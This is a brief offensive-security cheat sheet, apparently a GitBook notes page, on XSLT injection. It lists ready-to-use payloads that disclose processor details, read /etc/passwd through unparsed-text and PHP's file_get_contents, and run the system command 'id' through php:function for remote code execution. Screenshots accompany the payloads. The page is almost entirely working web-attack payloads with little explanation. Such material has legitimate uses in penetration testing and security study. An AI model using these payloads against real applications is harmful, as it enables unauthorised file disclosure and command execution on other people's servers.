---
aliases:
  - XSLT Injection
---
# XSLT Injection

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FNNBIREBWSRsh5BRDfHzB%2Fimage.png?alt=media&amp;token=6f15d6c8-8793-40ef-b446-e45546f248d8" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FkI8vxTkBmotnajixz4b9%2Fimage.png?alt=media&amp;token=22166d2f-708d-4a9d-b2b5-bce121359dc9" alt=""><figcaption></figcaption></figure>

Info disclose

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

Local File Inclusion (LFI)

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FEk7v9tBRusnKlIjDyPMQ%2Fimage.png?alt=media&amp;token=fce0ea8c-cb59-40ae-a2e2-e1f9d85910af" alt=""><figcaption></figcaption></figure>

## Remote Code Execution (RCE)

```xml
<xsl:value-of select="php:function('system','id')" />
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FncuURP4QuQPPzYn0Kg8O%2Fimage.png?alt=media&amp;token=0a80dec6-3680-4055-af85-298cc77379ae" alt=""><figcaption></figcaption></figure>
